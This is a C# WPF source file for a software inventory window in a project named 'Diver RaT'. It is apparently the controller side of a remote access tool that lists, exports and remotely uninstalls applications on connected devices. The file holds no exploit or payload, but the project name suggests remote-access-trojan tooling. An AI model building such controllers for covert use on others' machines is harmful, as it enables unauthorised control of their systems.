using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Windows;
using Microsoft.Win32;

namespace Diver_RaT
{
    public partial class SoftwareWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private List<SoftwareItem> _all = new();

        public SoftwareWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            Title = $"Software Inventory - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";
            _ = RefreshAsync();
        }

        private async System.Threading.Tasks.Task RefreshAsync()
        {
            LoadingOverlay.Visibility = Visibility.Visible;
            StatusText.Text = "Querying installed applications...";
            try
            {
                var result = await _server.SendCommandAsync(_device.Id, "LIST_APPS", timeoutMs: 30000);
                if (!result.Success || string.IsNullOrEmpty(result.Result))
                {
                    StatusText.Text = $"Failed: {result.Error}";
                    return;
                }

                var items = new List<SoftwareItem>();
                try
                {
                    using var doc = JsonDocument.Parse(result.Result);
                    foreach (var e in doc.RootElement.EnumerateArray())
                    {
                        items.Add(new SoftwareItem
                        {
                            Name = e.TryGetProperty("name", out var n) ? n.GetString() ?? "" : "",
                            Version = e.TryGetProperty("version", out var v) ? v.GetString() ?? "" : "",
                            Publisher = e.TryGetProperty("publisher", out var p) ? p.GetString() ?? "" : "",
                            Installed = e.TryGetProperty("installed", out var i) ? i.GetString() ?? "" : "",
                            SizeMb = e.TryGetProperty("sizeMb", out var s) && s.ValueKind == JsonValueKind.Number ? s.GetDouble() : 0,
                            Uninstall = e.TryGetProperty("uninstall", out var u) ? u.GetString() ?? "" : ""
                        });
                    }
                }
                catch (Exception ex)
                {
                    StatusText.Text = $"Invalid app list: {ex.Message}";
                    return;
                }

                _all = items;
                ApplyFilter();
                StatusText.Text = $"{_all.Count} installed application(s)  |  updated {DateTime.Now:HH:mm:ss}";
            }
            finally
            {
                LoadingOverlay.Visibility = Visibility.Collapsed;
            }
        }

        private void ApplyFilter()
        {
            var q = SearchBox.Text.Trim();
            if (q.Length == 0)
            {
                AppGrid.ItemsSource = _all;
                return;
            }
            AppGrid.ItemsSource = _all.FindAll(i =>
                i.Name.Contains(q, StringComparison.OrdinalIgnoreCase) ||
                i.Publisher.Contains(q, StringComparison.OrdinalIgnoreCase) ||
                i.Version.Contains(q, StringComparison.OrdinalIgnoreCase));
        }

        private void RefreshButton_Click(object sender, RoutedEventArgs e) => _ = RefreshAsync();

        private void SearchBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e) => ApplyFilter();

        private void ExportButton_Click(object sender, RoutedEventArgs e)
        {
            if (_all.Count == 0) return;
            var dlg = new SaveFileDialog
            {
                FileName = $"apps_{_device.ComputerName}_{DateTime.Now:yyyyMMdd_HHmmss}.csv",
                Filter = "CSV file|*.csv"
            };
            if (dlg.ShowDialog(this) != true) return;

            var sb = new StringBuilder();
            sb.AppendLine("Name,Version,Publisher,InstallDate,SizeMB");
            foreach (var a in _all)
            {
                sb.AppendLine(Csv(a.Name) + "," + Csv(a.Version) + "," + Csv(a.Publisher) + "," +
                              Csv(a.Installed) + "," + a.SizeMb.ToString("0.0", CultureInfo.InvariantCulture));
            }
            File.WriteAllText(dlg.FileName, sb.ToString());
            StatusText.Text = $"Exported {_all.Count} apps to {dlg.FileName}";
        }

        private static string Csv(string s) => "\"" + s.Replace("\"", "\"\"") + "\"";

        private void AppGrid_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
        {
            if (e.OriginalSource is not DependencyObject source) return;
            var row = FindVisualParent<System.Windows.Controls.DataGridRow>(source);
            if (row?.Item is SoftwareItem item) AppGrid.SelectedItem = item;
        }

        private async void UninstallMenu_Click(object sender, RoutedEventArgs e)
        {
            if (AppGrid.SelectedItem is not SoftwareItem item) return;
            var target = !string.IsNullOrEmpty(item.Uninstall) ? item.Uninstall : item.Publisher;
            if (string.IsNullOrEmpty(target)) return;
            var ok = MessageBox.Show(
                $"Uninstall '{item.Name}'?\n\nTarget: {target}\n\nConfirm any uninstall dialog that appears on the device.",
                "Diver RaT - Uninstall", MessageBoxButton.YesNo, MessageBoxImage.Warning) == MessageBoxResult.Yes;
            if (!ok) return;

            StatusText.Text = $"Requesting uninstall of {item.Name}...";
            var result = await _server.SendCommandAsync(_device.Id, "UNINSTALL_APP",
                new Dictionary<string, string> { ["package"] = target });
            StatusText.Text = result.Success
                ? $"Uninstall: {result.Result}"
                : $"Uninstall failed: {result.Error}";
            await RefreshAsync();
        }

        private static T? FindVisualParent<T>(DependencyObject? child) where T : DependencyObject
        {
            while (child is not null)
            {
                if (child is T match) return match;
                child = System.Windows.Media.VisualTreeHelper.GetParent(child);
            }
            return null;
        }
    }

    public class SoftwareItem
    {
        public string Name { get; set; } = "";
        public string Version { get; set; } = "";
        public string Publisher { get; set; } = "";
        public string Installed { get; set; } = "";
        public double SizeMb { get; set; }
        public string Uninstall { get; set; } = "";
    }
}
